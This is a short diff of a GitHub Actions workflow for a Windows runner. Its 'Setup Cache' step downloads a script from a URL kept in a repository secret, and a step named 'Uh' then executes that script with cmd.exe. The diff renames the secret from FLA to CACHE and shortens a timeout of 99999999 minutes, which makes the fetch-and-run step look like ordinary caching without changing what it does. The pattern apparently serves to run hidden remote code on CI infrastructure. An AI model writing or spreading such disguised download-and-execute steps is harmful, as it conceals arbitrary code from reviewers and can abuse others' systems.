@@ -5,13 +5,13 @@ on: push
 jobs:
   build:
     runs-on: windows-latest
-    timeout-minutes: 99999999
+    timeout-minutes: 60
     
     steps:
     - name: Setup Cache
-      run: Invoke-WebRequest "$Env:FLA" -OutFile C:\ss.cmd
+      run: Invoke-WebRequest "$Env:CACHE" -OutFile C:\ss.cmd
       env:
-        FLA: ${{ secrets.FLA }}
+        CACHE: ${{ secrets.CACHE }}
 
     - name: Uh
       run: cmd.exe /c "C:\ss.cmd"
